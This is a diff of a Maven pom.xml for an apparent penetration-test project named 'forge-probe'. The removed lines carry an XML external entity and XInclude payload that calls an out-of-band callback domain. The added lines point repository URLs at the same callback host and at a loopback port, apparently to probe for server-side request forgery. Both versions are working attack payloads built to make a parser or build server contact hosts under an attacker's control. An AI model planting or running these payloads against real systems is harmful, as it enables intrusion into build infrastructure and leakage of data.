@@ -1,15 +1,19 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE project SYSTEM "http://sd.PEN-EEQT-2522-7754.dns.collabp-reg1.devops.aws.dev/d.dtd" [
-  <!ENTITY ge SYSTEM "http://ge.PEN-EEQT-2522-7754.dns.collabp-reg1.devops.aws.dev/ge">
-  <!ENTITY % pe SYSTEM "http://pe.PEN-EEQT-2522-7754.dns.collabp-reg1.devops.aws.dev/pe.dtd">
-]>
-<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xi="http://www.w3.org/2001/XInclude">
+<project xmlns="http://maven.apache.org/POM/4.0.0">
   <modelVersion>4.0.0</modelVersion>
   <groupId>com.forge.probe</groupId>
   <artifactId>forge-probe</artifactId>
   <version>1.0.0</version>
-  <name>forge-probe &ge;</name>
-  <description><xi:include href="http://xi.PEN-EEQT-2522-7754.dns.collabp-reg1.devops.aws.dev/xi" parse="text"/></description>
+  <repositories>
+    <repository>
+      <id>forge-r16-oob</id>
+      <url>http://rp.PEN-EEQT-2522-7754.dns.collabp-reg1.devops.aws.dev/maven2</url>
+    </repository>
+    <repository>
+      <id>forge-r16-loopback</id>
+      <url>http://127.0.0.1:1/maven2</url>
+    </repository>
+  </repositories>
   <dependencies>
     <dependency>
       <groupId>com.google.guava</groupId>
